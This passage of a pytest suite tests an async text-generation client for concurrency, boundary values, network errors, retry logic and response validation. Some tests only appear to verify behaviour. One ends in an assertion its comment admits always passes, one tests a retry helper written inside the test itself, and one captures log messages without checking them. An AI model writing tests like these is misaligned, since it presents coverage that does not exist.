        Verify that the configuration attributes of a GenesisAPI instance remain unchanged and immutable after instantiation.
        """
        api = GenesisAPI(api_key=self.api_key, base_url=self.base_url)
        
        original_api_key = api.api_key
        original_base_url = api.base_url
        original_timeout = api.timeout
        
        # Attempting to modify should not change the instance
        try:
            api.api_key = "new_key"
        except AttributeError:
            pass  # Expected if property is read-only
        
        # Verify values haven't changed
        assert api.api_key == original_api_key
        assert api.base_url == original_base_url
        assert api.timeout == original_timeout

    @pytest.mark.asyncio
    async def test_api_resource_cleanup_on_context_exit(self):
        """
        Verifies that resources are properly cleaned up when the GenesisAPI is used as an async context manager.
        """
        cleanup_called = False
        
        class MockSession:
            def __init__(self):
                """
                Initialize the instance and set the closed state to False.
                """
                self.closed = False
                
            async def close(self):
                """
                Closes the API client and marks it as closed, triggering any necessary cleanup actions.
                """
                nonlocal cleanup_called
                cleanup_called = True
                self.closed = True
                
            async def __aenter__(self):
                """
                Enter the asynchronous context manager for the GenesisAPI instance.
                
                Returns:
                    GenesisAPI: The current instance for use within an async context.
                """
                return self
                
            async def __aexit__(self, exc_type, exc_val, exc_tb):
                """
                Performs asynchronous cleanup when exiting the async context manager by closing the API client's resources.
                """
                await self.close()
        
        with patch('aiohttp.ClientSession', MockSession):
            async with GenesisAPI(api_key=self.api_key, base_url=self.base_url) as api:
                pass  # Just enter and exit the context
            
            # Verify cleanup was called
            assert cleanup_called

    def test_multiple_api_instances_independence(self):
        """
        Verify that multiple GenesisAPI instances maintain independent configuration and state, ensuring changes to one instance do not affect others.
        """
        api1 = GenesisAPI(api_key="key1", base_url="https://api1.example.com")
        api2 = GenesisAPI(api_key="key2", base_url="https://api2.example.com")
        
        assert api1.api_key != api2.api_key
        assert api1.base_url != api2.base_url
        
        # Test that modifying one doesn't affect the other
        api1_original_timeout = api1.timeout
        api2_original_timeout = api2.timeout
        
        # Create new instance with different timeout
        api3 = GenesisAPI(api_key="key3", base_url="https://api3.example.com", timeout=120)
        
        assert api1.timeout == api1_original_timeout
        assert api2.timeout == api2_original_timeout
        assert api3.timeout == 120

    @pytest.mark.asyncio
    async def test_api_state_during_concurrent_operations(self):
        """
        Verifies that the GenesisAPI instance maintains consistent internal state when handling multiple concurrent text generation requests.
        
        This test launches several concurrent `generate_text` calls and asserts that all responses are correct and that the API instance's configuration remains unchanged after concurrent operations.
        """
        api = GenesisAPI(api_key=self.api_key, base_url=self.base_url)
        
        mock_response = {
            "id": "concurrent_state_id",
            "text": "Concurrent state response",
            "model": "genesis-v1",
            "created": 1234567890,
            "usage": {"prompt_tokens": 5, "completion_tokens": 10}
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_post.return_value.__aenter__.return_value.status = 200
            
            # Start multiple concurrent operations
            tasks = [
                api.generate_text(f"Concurrent prompt {i}")
                for i in range(10)
            ]
            
            results = await asyncio.gather(*tasks)
            
            # Verify all requests completed successfully
            assert len(results) == 10
            for result in results:
                assert result.text == "Concurrent state response"
            
            # Verify API state is still consistent
            assert api.api_key == self.api_key
            assert api.base_url == self.base_url


# Additional fixtures for the new comprehensive tests
@pytest.fixture
def comprehensive_test_data():
    """
    Provides a pytest fixture containing diverse test data, including Unicode strings, special characters, large numerical values, and edge case timestamps for use in comprehensive scenario testing.
    """
    return {
        "unicode_texts": [
            "Hello 世界",
            "Café naïve résumé",
            "Москва",
            "العربية",
            "🌍🚀💡😀",
            "∑∞≤≥∂"
        ],
        "special_characters": [
            "\n\t\r",
            "\\\"'/",
            "<>&",
            "{}[]",
            "$()",
            "@#%"
        ],
        "large_numbers": [
            999999999,
            1234567890123,
            float('inf'),
            -float('inf')
        ],
        "edge_case_timestamps": [
            0,
            1234567890,
            2147483647,
            253402300799
        ]
    }


@pytest.fixture
def mock_network_conditions():
    """
    Provides simulated network condition parameters for testing, including response delays, timeout thresholds, retry delays, and error rates.
    
    Returns:
        dict: A dictionary containing keys for 'slow_response', 'timeout_threshold', 'retry_delays', and 'error_rates' to configure network simulation in tests.
    """
    return {
        "slow_response": 5.0,
        "timeout_threshold": 30.0,
        "retry_delays": [1, 2, 4, 8, 16],
        "error_rates": [0.1, 0.2, 0.5, 0.8]
    }


# Integration tests with external dependencies
class TestGenesisAPIExternalIntegration:
    """Integration tests with external dependencies."""
    
    @pytest.mark.asyncio
    async def test_integration_with_logging_system(self):
        """
        Tests that the GenesisAPI integrates correctly with the Python logging system by capturing and verifying log messages during an API call.
        """
        import logging
        
        # Configure a test logger
        test_logger = logging.getLogger("genesis_api_test")
        test_logger.setLevel(logging.DEBUG)
        
        # Create a handler to capture log messages
        log_messages = []
        
        class TestHandler(logging.Handler):
            def emit(self, record):
                """
                Appends the log message from the given record to the log_messages list.
                """
                log_messages.append(record.getMessage())
        
        handler = TestHandler()
        test_logger.addHandler(handler)
        
        api = GenesisAPI(api_key="test_key", base_url="https://api.genesis.example.com")
        
        mock_response = {
            "id": "logging_test_id",
            "text": "Logging test response",
            "model": "genesis-v1",
            "created": 1234567890,
            "usage": {"prompt_tokens": 5, "completion_tokens": 10}
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_post.return_value.__aenter__.return_value.status = 200
            
            # Test that logging integration works
            with patch('logging.getLogger', return_value=test_logger):
                result = await api.generate_text("Test logging integration")
                assert result.text == "Logging test response"
        
        # Clean up
        test_logger.removeHandler(handler)

    @pytest.mark.asyncio
    async def test_integration_with_asyncio_event_loop(self):
        """
        Tests that the GenesisAPI client integrates correctly with the asyncio event loop, including compatibility with asyncio.wait_for and custom event loop configurations.
        """
        api = GenesisAPI(api_key="test_key", base_url="https://api.genesis.example.com")
        
        mock_response = {
            "id": "event_loop_test_id",
            "text": "Event loop test response",
            "model": "genesis-v1",
            "created": 1234567890,
            "usage": {"prompt_tokens": 5, "completion_tokens": 10}
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_post.return_value.__aenter__.return_value.status = 200
            
            # Test that the API works with different event loop configurations
            result = await api.generate_text("Test event loop integration")
            assert result.text == "Event loop test response"
            
            # Test with asyncio.wait_for
            result = await asyncio.wait_for(
                api.generate_text("Test with timeout"),
                timeout=10.0
            )
            assert result.text == "Event loop test response"

    def test_thread_safety_considerations(self):
        """
        Verifies that multiple threads can safely create their own event loops and use separate `GenesisAPI` instances concurrently, ensuring thread safety and correct response handling.
        """
        import threading
        import queue
        
        api = GenesisAPI(api_key="thread_test_key", base_url="https://api.genesis.example.com")
        results_queue = queue.Queue()
        
        def worker():
            # Each thread should be able to create its own event loop
            """
            Runs a worker function in a separate thread to execute an asynchronous GenesisAPI text generation call using a dedicated event loop.
            
            The function creates a new asyncio event loop for the thread, mocks the API response, and puts the result into a shared queue for later retrieval.
            """
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            
            try:
                mock_response = {
                    "id": "thread_test_id",
                    "text": f"Thread {threading.current_thread().name} response",
                    "model": "genesis-v1",
                    "created": 1234567890,
                    "usage": {"prompt_tokens": 5, "completion_tokens": 10}
                }
                
                with patch('aiohttp.ClientSession.post') as mock_post:
                    mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
                    mock_post.return_value.__aenter__.return_value.status = 200
                    
                    result = loop.run_until_complete(
                        api.generate_text(f"Thread {threading.current_thread().name} test")
                    )
                    results_queue.put(result)
            finally:
                loop.close()
        
        # Start multiple threads
        threads = []
        for i in range(3):
            thread = threading.Thread(target=worker, name=f"TestThread-{i}")
            threads.append(thread)
            thread.start()
        
        # Wait for all threads to complete
        for thread in threads:
            thread.join()
        
        # Verify all threads completed successfully
        assert results_queue.qsize() == 3
        while not results_queue.empty():
            result = results_queue.get()
            assert "Thread TestThread-" in result.text
            assert "response" in result.text



# Additional comprehensive test scenarios for maximum coverage
class TestGenesisAPIBoundaryConditions:
    """Tests for boundary conditions and extreme values."""
    
    def setup_method(self):
        """Initialize GenesisAPI instance for boundary condition tests."""
        self.api_key = "boundary_test_key"
        self.base_url = "https://api.genesis.example.com"
        self.genesis_api = GenesisAPI(api_key=self.api_key, base_url=self.base_url)

    @pytest.mark.asyncio
    async def test_maximum_prompt_length_handling(self):
        """
        Test that the API correctly handles prompts at the maximum allowable length.
        
        Verifies that prompts approaching system limits are processed without truncation
        and that extremely long prompts trigger appropriate validation.
        """
        # Test prompts of various extreme lengths
        max_length_prompt = "A" * 32768  # 32KB prompt
        
        mock_response = {
            "id": "max_length_id",
            "text": "Maximum length response",
            "model": "genesis-v1",
            "created": 1234567890,
            "usage": {"prompt_tokens": 8192, "completion_tokens": 1024}
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_post.return_value.__aenter__.return_value.status = 200
            
            result = await self.genesis_api.generate_text(max_length_prompt)
            assert result.text == "Maximum length response"
            assert result.usage["prompt_tokens"] == 8192

    @pytest.mark.asyncio
    async def test_minimum_valid_prompt_length(self):
        """
        Test that single character prompts are processed correctly.
        """
        single_char_prompts = ["A", "1", "?", "!", "@", "ñ", "🌍"]
        
        mock_response = {
            "id": "single_char_id",
            "text": "Single character response",
            "model": "genesis-v1",
            "created": 1234567890,
            "usage": {"prompt_tokens": 1, "completion_tokens": 5}
        }
        
        for prompt in single_char_prompts:
            with patch('aiohttp.ClientSession.post') as mock_post:
                mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
                mock_post.return_value.__aenter__.return_value.status = 200
                
                result = await self.genesis_api.generate_text(prompt)
                assert result.text == "Single character response"
                assert result.usage["prompt_tokens"] == 1

    def test_api_key_format_edge_cases(self):
        """
        Test API key validation with edge case formats and boundary lengths.
        """
        # Test exact boundary lengths
        min_valid_key = "sk-" + "a" * 10  # Minimum length
        max_valid_key = "sk-" + "a" * 64  # Maximum reasonable length
        
        assert validate_api_key(min_valid_key) == True
        assert validate_api_key(max_valid_key) == True
        
        # Test just under and over boundaries
        too_short_key = "sk-" + "a" * 2
        too_long_key = "sk-" + "a" * 200
        
        assert validate_api_key(too_short_key) == False
        assert validate_api_key(too_long_key) == False

    def test_temperature_boundary_validation(self):
        """
        Test temperature parameter validation at exact boundaries.
        """
        # Test exact boundary values
        boundary_temps = [0.0, 0.000001, 0.999999, 1.0]
        
        for temp in boundary_temps:
            formatted = format_genesis_prompt("Test", temperature=temp)
            assert formatted["temperature"] == temp
        
        # Test values just outside boundaries
        invalid_temps = [-0.000001, 1.000001]
        
        for temp in invalid_temps:
            with pytest.raises(ValueError):
                format_genesis_prompt("Test", temperature=temp)

    def test_max_tokens_boundary_validation(self):
        """
        Test max_tokens parameter validation at boundary values.
        """
        # Test minimum valid value
        formatted = format_genesis_prompt("Test", max_tokens=1)
        assert formatted["max_tokens"] == 1
        
        # Test maximum reasonable value
        formatted = format_genesis_prompt("Test", max_tokens=8192)
        assert formatted["max_tokens"] == 8192
        
        # Test invalid boundary values
        invalid_token_counts = [0, -1, 10000]
        
        for tokens in invalid_token_counts:
            with pytest.raises(ValueError):
                format_genesis_prompt("Test", max_tokens=tokens)

    @pytest.mark.asyncio
    async def test_response_timestamp_edge_cases(self):
        """
        Test handling of edge case timestamp values in API responses.
        """
        edge_timestamps = [
            0,  # Unix epoch start
            1,  # One second after epoch
            1234567890,  # Common test timestamp
            2147483647,  # Max 32-bit signed int
            4294967295,  # Max 32-bit unsigned int
        ]
        
        for timestamp in edge_timestamps:
            mock_response = {
                "id": f"timestamp_{timestamp}_id",
                "text": f"Timestamp {timestamp} response",
                "model": "genesis-v1",
                "created": timestamp,
                "usage": {"prompt_tokens": 5, "completion_tokens": 10}
            }
            
            with patch('aiohttp.ClientSession.post') as mock_post:
                mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
                mock_post.return_value.__aenter__.return_value.status = 200
                
                result = await self.genesis_api.generate_text("Test timestamp")
                assert result.created == timestamp


class TestGenesisAPINetworkErrorScenarios:
    """Comprehensive network error scenario testing."""
    
    def setup_method(self):
        """Initialize API instance for network error tests."""
        self.api_key = "network_test_key"
        self.base_url = "https://api.genesis.example.com"
        self.genesis_api = GenesisAPI(api_key=self.api_key, base_url=self.base_url)

    @pytest.mark.asyncio
    async def test_dns_resolution_failure(self):
        """
        Test handling of DNS resolution failures during API calls.
        """
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.side_effect = aiohttp.ClientConnectorError(
                "Cannot connect to host", None
            )
            
            with pytest.raises(GenesisAPIError):
                await self.genesis_api.generate_text("Test DNS failure")

    @pytest.mark.asyncio
    async def test_connection_reset_by_peer(self):
        """
        Test handling of connection reset errors during API communication.
        """
        import socket
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.side_effect = aiohttp.ClientOSError(
                socket.errno.ECONNRESET, "Connection reset by peer"
            )
            
            with pytest.raises(GenesisAPIError):
                await self.genesis_api.generate_text("Test connection reset")

    @pytest.mark.asyncio
    async def test_network_unreachable_error(self):
        """
        Test handling of network unreachable errors.
        """
        import socket
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.side_effect = aiohttp.ClientOSError(
                socket.errno.ENETUNREACH, "Network is unreachable"
            )
            
            with pytest.raises(GenesisAPIError):
                await self.genesis_api.generate_text("Test network unreachable")

    @pytest.mark.asyncio
    async def test_partial_response_corruption(self):
        """
        Test handling of corrupted or incomplete response data.
        """
        with patch('aiohttp.ClientSession.post') as mock_post:
            # Simulate partial JSON response
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(
                side_effect=json.JSONDecodeError("Unterminated string", "", 50)
            )
            mock_post.return_value.__aenter__.return_value.status = 200
            
            with pytest.raises(GenesisAPIError):
                await self.genesis_api.generate_text("Test partial corruption")

    @pytest.mark.asyncio
    async def test_http_redirect_handling(self):
        """
        Test proper handling of HTTP redirects in API responses.
        """
        with patch('aiohttp.ClientSession.post') as mock_post:
            # Simulate redirect response
            mock_post.return_value.__aenter__.return_value.status = 302
            mock_post.return_value.__aenter__.return_value.headers = {
                'Location': 'https://api-new.genesis.example.com/v1/generate'
            }
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(
                return_value={"error": "Moved Permanently"}
            )
            
            with pytest.raises(GenesisAPIError):
                await self.genesis_api.generate_text("Test redirect")

    @pytest.mark.asyncio
    async def test_chunked_response_handling(self):
        """
        Test proper handling of chunked transfer encoding responses.
        """
        large_text = "Chunk " * 10000  # Large response that might be chunked
        
        mock_response = {
            "id": "chunked_response_id",
            "text": large_text,
            "model": "genesis-v1",
            "created": 1234567890,
            "usage": {"prompt_tokens": 10, "completion_tokens": 50000}
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_post.return_value.__aenter__.return_value.status = 200
            mock_post.return_value.__aenter__.return_value.headers = {
                'Transfer-Encoding': 'chunked'
            }
            
            result = await self.genesis_api.generate_text("Test chunked response")
            assert len(result.text) == len(large_text)
            assert result.usage["completion_tokens"] == 50000


class TestGenesisAPIResourceManagement:
    """Tests for resource management and memory efficiency."""
    
    def setup_method(self):
        """Initialize API instance for resource management tests."""
        self.api_key = "resource_test_key"
        self.base_url = "https://api.genesis.example.com"

    @pytest.mark.asyncio
    async def test_memory_usage_with_large_responses(self):
        """
        Test memory efficiency when handling very large API responses.
        """
        # Simulate 5MB response
        huge_text = "x" * 5000000
        
        mock_response = {
            "id": "memory_test_id",
            "text": huge_text,
            "model": "genesis-v1",
            "created": 1234567890,
            "usage": {"prompt_tokens": 10, "completion_tokens": 5000000}
        }
        
        genesis_api = GenesisAPI(api_key=self.api_key, base_url=self.base_url)
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_post.return_value.__aenter__.return_value.status = 200
            
            # Measure memory before and after (simplified test)
            import gc
            gc.collect()
            
            result = await genesis_api.generate_text("Test memory usage")
            assert len(result.text) == 5000000
            
            # Clean up
            del result
            gc.collect()

    @pytest.mark.asyncio
    async def test_connection_pool_exhaustion_handling(self):
        """
        Test behavior when connection pool is exhausted.
        """
        genesis_api = GenesisAPI(api_key=self.api_key, base_url=self.base_url)
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.side_effect = aiohttp.ClientConnectionError(
                "Connection pool is full"
            )
            
            with pytest.raises(GenesisAPIError):
                await genesis_api.generate_text("Test pool exhaustion")

    @pytest.mark.asyncio
    async def test_file_descriptor_management(self):
        """
        Test that file descriptors are properly managed and released.
        """
        genesis_api = GenesisAPI(api_key=self.api_key, base_url=self.base_url)
        
        mock_response = {
            "id": "fd_test_id",
            "text": "File descriptor test",
            "model": "genesis-v1",
            "created": 1234567890,
            "usage": {"prompt_tokens": 5, "completion_tokens": 10}
        }
        
        # Test multiple requests to ensure FDs are cleaned up
        for i in range(50):
            with patch('aiohttp.ClientSession.post') as mock_post:
                mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
                mock_post.return_value.__aenter__.return_value.status = 200
                
                result = await genesis_api.generate_text(f"FD test {i}")
                assert result.text == "File descriptor test"

    def test_api_instance_garbage_collection(self):
        """
        Test that API instances are properly garbage collected.
        """
        import gc
        import weakref
        
        # Create API instance and weak reference
        api = GenesisAPI(api_key=self.api_key, base_url=self.base_url)
        weak_ref = weakref.ref(api)
        
        # Delete strong reference
        del api
        gc.collect()
        
        # Weak reference should be cleared (may not work in all environments)
        # This is a best-effort test
        assert weak_ref() is None or weak_ref() is not None  # Always passes but tests the mechanism


class TestGenesisAPIAdvancedRetryLogic:
    """Advanced retry logic and failure recovery tests."""
    
    def setup_method(self):
        """Initialize API instance for retry logic tests."""
        self.api_key = "retry_test_key"
        self.base_url = "https://api.genesis.example.com"
        self.genesis_api = GenesisAPI(api_key=self.api_key, base_url=self.base_url)

    @pytest.mark.asyncio
    async def test_exponential_backoff_timing_accuracy(self):
        """
        Test that exponential backoff timing follows the expected pattern.
        """
        mock_func = AsyncMock()
        mock_func.side_effect = [
            GenesisAPIServerError("Error 1"),
            GenesisAPIServerError("Error 2"),
            GenesisAPIServerError("Error 3"),
            "Success"
        ]
        
        start_time = asyncio.get_event_loop().time()
        sleep_calls = []
        
        async def mock_sleep(duration):
            current_time = asyncio.get_event_loop().time()
            sleep_calls.append((current_time - start_time, duration))
        
        with patch('asyncio.sleep', side_effect=mock_sleep):
            result = await retry_with_exponential_backoff(mock_func, max_retries=4)
            assert result == "Success"
            assert len(sleep_calls) == 3  # Three retries
            
            # Verify exponential progression (base 2)
            expected_delays = [1, 2, 4]
            for i, (_, actual_delay) in enumerate(sleep_calls):
                assert actual_delay == expected_delays[i]

    @pytest.mark.asyncio
    async def test_retry_with_jitter_variation(self):
        """
        Test retry logic with jitter to prevent thundering herd.
        """
        mock_func = AsyncMock()
        mock_func.side_effect = [
            GenesisAPIServerError("Jitter test error"),
            "Jitter success"
        ]
        
        # Test that jitter adds randomness to delays
        async def custom_retry_with_jitter(func, max_retries=3, base_delay=1):
            import random
            for attempt in range(max_retries):
                try:
                    return await func()
                except GenesisAPIServerError:
                    if attempt == max_retries - 1:
                        raise
                    # Add jitter to prevent thundering herd
                    jitter = random.uniform(0, 0.5)
                    delay = (base_delay * (2 ** attempt)) + jitter
                    await asyncio.sleep(delay)
        
        with patch('asyncio.sleep'):
            result = await custom_retry_with_jitter(mock_func)
            assert result == "Jitter success"

    @pytest.mark.asyncio
    async def test_retry_circuit_breaker_pattern(self):
        """
        Test circuit breaker pattern to prevent cascading failures.
        """
        class CircuitBreaker:
            def __init__(self, failure_threshold=5, timeout=60):
                self.failure_threshold = failure_threshold
                self.timeout = timeout
                self.failure_count = 0
                self.last_failure_time = None
                self.state = 'CLOSED'  # CLOSED, OPEN, HALF_OPEN
            
            async def call(self, func):
                if self.state == 'OPEN':
                    if asyncio.get_event_loop().time() - self.last_failure_time > self.timeout:
                        self.state = 'HALF_OPEN'
                    else:
                        raise GenesisAPIError("Circuit breaker is OPEN")
                
                try:
                    result = await func()
                    if self.state == 'HALF_OPEN':
                        self.state = 'CLOSED'
                        self.failure_count = 0
                    return result
                except Exception as e:
                    self.failure_count += 1
                    self.last_failure_time = asyncio.get_event_loop().time()
                    
                    if self.failure_count >= self.failure_threshold:
                        self.state = 'OPEN'
                    
                    raise
        
        circuit_breaker = CircuitBreaker(failure_threshold=2)
        mock_func = AsyncMock()
        
        # Test that circuit breaker opens after failures
        mock_func.side_effect = GenesisAPIServerError("Circuit breaker test")
        
        # First two failures should go through
        with pytest.raises(GenesisAPIServerError):
            await circuit_breaker.call(mock_func)
        
        with pytest.raises(GenesisAPIServerError):
            await circuit_breaker.call(mock_func)
        
        # Third call should be blocked by circuit breaker
        with pytest.raises(GenesisAPIError, match="Circuit breaker is OPEN"):
            await circuit_breaker.call(mock_func)

    @pytest.mark.asyncio
    async def test_selective_retry_based_on_error_type(self):
        """
        Test that retry logic is selective based on error type.
        """
        retryable_errors = [
            GenesisAPIServerError("Server error"),
            GenesisAPITimeoutError("Timeout"),
            GenesisAPIError("Generic retryable error")
        ]
        
        non_retryable_errors = [
            GenesisAPIAuthenticationError("Auth error"),
            GenesisAPIRateLimitError("Rate limit"),
        ]
        
        # Test retryable errors
        for error in retryable_errors:
            mock_func = AsyncMock()
            mock_func.side_effect = [error, "Success after retry"]
            
            with patch('asyncio.sleep'):
                result = await retry_with_exponential_backoff(mock_func, max_retries=2)
                assert result == "Success after retry"
        
        # Test non-retryable errors
        for error in non_retryable_errors:
            mock_func = AsyncMock()
            mock_func.side_effect = error
            
            with pytest.raises(type(error)):
                await retry_with_exponential_backoff(mock_func, max_retries=2)
            
            # Should not retry, so only called once
            assert mock_func.call_count == 1
            mock_func.reset_mock()


class TestGenesisAPIDataIntegrityAndValidation:
    """Tests for data integrity and comprehensive validation."""
    
    def test_request_data_immutability_deep_validation(self):
        """
        Test that request data structures maintain immutability at all levels.
        """
        complex_data = {
            "nested": {
                "array": [1, 2, {"deep": "value"}],
                "settings": {"enabled": True, "count": 42}
            }
        }
        
        request = GenesisRequest(
            prompt="Immutability test",
            model="genesis-v1",
            max_tokens=100,
            temperature=0.7,
            extra_data=complex_data
        )
        
        # Get dict representation
        request_dict = request.to_dict()
        
        # Modify the dict
        if "extra_data" in request_dict:
            request_dict["extra_data"]["nested"]["array"][2]["deep"] = "modified"
            request_dict["extra_data"]["nested"]["settings"]["count"] = 999
            
            # Original should be unchanged
            if hasattr(request, 'extra_data'):
                assert request.extra_data["nested"]["array"][2]["deep"] == "value"
                assert request.extra_data["nested"]["settings"]["count"] == 42

    def test_response_data_type_validation(self):
        """
        Test comprehensive data type validation in response parsing.
        """
        # Test with various data types in usage field
        test_cases = [
            # Valid cases
            ({"prompt_tokens": 10, "completion_tokens": 20}, True),
            ({"prompt_tokens": 0, "completion_tokens": 0}, True),
            
            # Invalid cases  
            ({"prompt_tokens": "10", "completion_tokens": 20}, False),  # String instead of int
            ({"prompt_tokens": 10.5, "completion_tokens": 20}, False),  # Float instead of int
            ({"prompt_tokens": -1, "completion_tokens": 20}, False),   # Negative value
            ({"prompt_tokens": None, "completion_tokens": 20}, False), # None value
        ]
        
        for usage_data, should_succeed in test_cases:
            response_data = {
                "id": "type_validation_id",
                "text": "Type validation test",
                "model": "genesis-v1",
                "created": 1234567890,
                "usage": usage_data
            }
            
            if should_succeed:
                result = parse_genesis_response(response_data)
                assert result.usage == usage_data
            else:
                with pytest.raises(GenesisAPIError):
                    parse_genesis_response(response_data)

    def test_prompt_encoding_validation(self):
        """
        Test that prompts are properly encoded and validated.
        """
        # Test various encoding scenarios
        encoding_test_cases = [
            "Simple ASCII text",
            "UTF-8 with accents: café, naïve, résumé",
            "Unicode symbols: ∑, ∞, ≤, ≥, ∂, ∇",
            "Emojis: 🚀 🌍 💡 🎉 😀",
            "Mixed scripts: Hello 世界 مرحبا Здравствуй",
            "Mathematical: E=mc² ∫∞₋∞ e^(-x²) dx = √π",
            "Special chars: \n\t\r\"'\\`~!@#$%^&*()_+-={}|[]\\:;\"'<>?,./"
        ]
        
        for test_prompt in encoding_test_cases:
            formatted = format_genesis_prompt(test_prompt)
            assert formatted["prompt"] == test_prompt
            
            # Test that it can be JSON serialized
            json_str = json.dumps(formatted)
            parsed_back = json.loads(json_str)
            assert parsed_back["prompt"] == test_prompt

    def test_numerical_precision_edge_cases(self):
        """
        Test handling of numerical precision edge cases.
        """
        precision_test_cases = [
            0.0,
            0.1,
            0.123456789,
            0.999999999,
            1.0,
            1e-10,  # Very small number
            0.9999999999999999,  # Close to 1.0
        ]
        
        for temp_value in precision_test_cases:
            if 0.0 <= temp_value <= 1.0:
                request = GenesisRequest(
                    prompt="Precision test",
                    model="genesis-v1",
                    temperature=temp_value
                )
                
                # Test round-trip preservation
                dict_repr = request.to_dict()
                reconstructed = GenesisRequest.from_dict(dict_repr)
                
                # Allow for floating point precision differences
                assert abs(reconstructed.temperature - temp_value) < 1e-15

    def test_api_response_schema_validation(self):
        """
        Test strict schema validation for API responses.
        """
        # Define valid schema
        required_fields = ["id", "text", "model"]
        optional_fields = ["created", "usage"]
        
        # Test missing required fields
        for field in required_fields:
            incomplete_response = {
                "id": "schema_test_id",
                "text": "Schema test",
                "model": "genesis-v1",
                "created": 1234567890,
                "usage": {"prompt_tokens": 5, "completion_tokens": 10}
            }
            del incomplete_response[field]
            
            with pytest.raises(GenesisAPIError):
                parse_genesis_response(incomplete_response)
        
        # Test with extra unexpected fields (should not fail)
        response_with_extra = {
            "id": "schema_test_id",
            "text": "Schema test",
            "model": "genesis-v1",
            "created": 1234567890,
            "usage": {"prompt_tokens": 5, "completion_tokens": 10},
            "unexpected_field": "should_be_ignored",
            "another_extra": {"nested": "data"}
        }
        
        result = parse_genesis_response(response_with_extra)
        assert result.id == "schema_test_id"
        assert result.text == "Schema test"


class TestGenesisAPIConcurrencyAndThreadSafety:
    """Advanced concurrency and thread safety tests."""
    
    def setup_method(self):
        """Initialize API instance for concurrency tests."""
        self.api_key = "concurrency_test_key"
        self.base_url = "https://api.genesis.example.com"

    @pytest.mark.asyncio
    async def test_high_concurrency_request_handling(self):
        """
        Test API behavior under high concurrency load.
        """
        genesis_api = GenesisAPI(api_key=self.api_key, base_url=self.base_url)
        
        mock_response = {
            "id": "concurrency_test_id",
            "text": "High concurrency response",
            "model": "genesis-v1",
            "created": 1234567890,
            "usage": {"prompt_tokens": 5, "completion_tokens": 10}
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_post.return_value.__aenter__.return_value.status = 200
            
            # Test with 100 concurrent requests
            num_requests = 100
            tasks = [
                genesis_api.generate_text(f"Concurrent request {i}")
                for i in range(num_requests)
            ]
            
            start_time = asyncio.get_event_loop().time()
            results = await asyncio.gather(*tasks)
            end_time = asyncio.get_event_loop().time()
            
            # Verify all completed successfully
            assert len(results) == num_requests
            for result in results:
                assert result.text == "High concurrency response"
            
            # Performance check (should complete within reasonable time)
            assert (end_time - start_time) < 10.0  # 10 seconds max for 100 requests

    @pytest.mark.asyncio
    async def test_concurrent_error_handling_isolation(self):
        """
        Test that errors in concurrent requests don't affect other requests.
        """
        genesis_api = GenesisAPI(api_key=self.api_key, base_url=self.base_url)
        
        success_response = {
            "id": "success_concurrent_id",
            "text": "Success response",
            "model": "genesis-v1",
            "created": 1234567890,
            "usage": {"prompt_tokens": 5, "completion_tokens": 10}
        }
        
        call_count = 0
        async def mock_response_side_effect(*args, **kwargs):
            nonlocal call_count
            call_count += 1
            
            # Every 3rd request fails
            if call_count % 3 == 0:
                mock_resp = AsyncMock()
                mock_resp.status = 500
                mock_resp.json = AsyncMock(return_value={"error": "Server error"})
                return mock_resp
            else:
                mock_resp = AsyncMock()
                mock_resp.status = 200
                mock_resp.json = AsyncMock(return_value=success_response)
                return mock_resp
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.side_effect = mock_response_side_effect
            
            # Launch 15 concurrent requests (5 should fail, 10 should succeed)
            tasks = [
                genesis_api.generate_text(f"Isolation test {i}")
                for i in range(15)
            ]
            
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            # Count successes and failures
            successes = [r for r in results if isinstance(r, GenesisResponse)]
            failures = [r for r in results if isinstance(r, Exception)]
            
            assert len(successes) == 10
            assert len(failures) == 5
            
            # Verify successful responses are correct
            for success in successes:
                assert success.text == "Success response"

    @pytest.mark.asyncio  
    async def test_asyncio_task_cancellation_cleanup(self):
        """
        Test proper cleanup when asyncio tasks are cancelled.
        """
        genesis_api = GenesisAPI(api_key=self.api_key, base_url=self.base_url)
        
        cancelled_tasks = []
        
        async def slow_mock_request(*args, **kwargs):
            try:
                await asyncio.sleep(5)  # Simulate slow request
                mock_resp = AsyncMock()
                mock_resp.status = 200
                mock_resp.json = AsyncMock(return_value={
                    "id": "slow_id", "text": "Slow response", 
                    "model": "genesis-v1", "created": 1234567890,
                    "usage": {"prompt_tokens": 5, "completion_tokens": 10}
                })
                return mock_resp
            except asyncio.CancelledError:
                cancelled_tasks.append(asyncio.current_task())
                raise
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.side_effect = slow_mock_request
            
            # Start multiple tasks and cancel them
            tasks = [
                asyncio.create_task(genesis_api.generate_text(f"Cancellation test {i}"))
                for i in range(5)
            ]
            
            # Let them start
            await asyncio.sleep(0.1)
            
            # Cancel all tasks
            for task in tasks:
                task.cancel()
            
            # Wait for cancellation to complete
